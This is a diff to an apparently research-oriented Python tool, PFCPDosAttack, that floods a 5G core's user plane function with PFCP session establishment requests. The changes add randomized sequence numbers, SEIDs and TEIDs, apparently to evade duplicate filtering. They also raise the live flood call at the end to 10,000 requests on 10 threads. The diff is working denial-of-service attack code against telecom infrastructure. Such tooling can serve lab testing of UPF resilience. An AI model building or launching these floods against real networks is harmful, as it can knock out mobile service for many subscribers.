@@ -162,7 +162,7 @@ class Ez_PFCP:
 
 
 class PFCPDosAttack:
-    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1"):
+    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False):
         self.evil_addr = evil_addr
         self.upf_addr = upf_addr
         self.src_port = src_port
@@ -174,10 +174,18 @@ class PFCPDosAttack:
         self._ue_counter = 1
         self.pfcp_association_packet= None
         self.pfcp_establishment_packet_list = []
-        self.verbose = False
-        self.prepare = False
+        self.verbose = verbose
+        self.prepare = prepare
+        self.randomize = randomize
         
-        
+    def set_radomize(self, randomize=True):
+        self.randomize = randomize
+        if not self.verbose : return
+        if randomize:
+            print("[DoS] Randomize mode enabled")
+        else:
+            print("[DoS] Randomize mode disabled")
+    
     def set_prepare(self, prepare=True):
         self.prepare = prepare
         if not self.verbose : return
@@ -185,13 +193,6 @@ class PFCPDosAttack:
             print("[DoS] Prepare mode enabled")
         else:
             print("[DoS] Prepare mode disabled")
-            
-        
-    def new_ue_addr(self):
-        next_ip = self.ue_base_addr + self._ue_counter
-        self._ue_counter += 1
-        return str(next_ip)
-        
     
     def set_verbose(self, verbose=True):
         self.verbose = verbose
@@ -200,7 +201,16 @@ class PFCPDosAttack:
         else:
             print("[DoS]Verbose mode disabled")
     
+    def new_ue_addr(self):
+        next_ip = self.ue_base_addr + self._ue_counter
+        self._ue_counter += 1
+        return str(next_ip)
+    
     def new_seq(self):
+        if self.randomize:
+            self.seq = random.randint(1, 0xFFFFFFFF)
+            return self.seq
+        
         seq = self.seq
         self.seq += 1
         if self.seq > 0xFFFFFFFF:
@@ -208,6 +218,10 @@ class PFCPDosAttack:
         return seq
     
     def new_seid(self):
+        if self.randomize:
+            self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
+            return self.seid
+        
         seid = self.seid_counter
         self.seid_counter += 1
         if self.seid_counter > 0xFFFFFFFFFFFFFFFF:
@@ -215,6 +229,10 @@ class PFCPDosAttack:
         return seid
     
     def new_teid(self):
+        if self.randomize:
+            self.teid = random.randint(1, 0xFFFFFFFF)
+            return self.teid
+        
         teid = self.teid_counter
         self.teid_counter += 1
         if self.teid_counter > 0xFFFFFFFF:
@@ -364,5 +382,5 @@ class PFCPDosAttack:
 
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
-
-objet_dos.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=1)
+objet_dos.set_radomize(True)
+objet_dos.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=10)
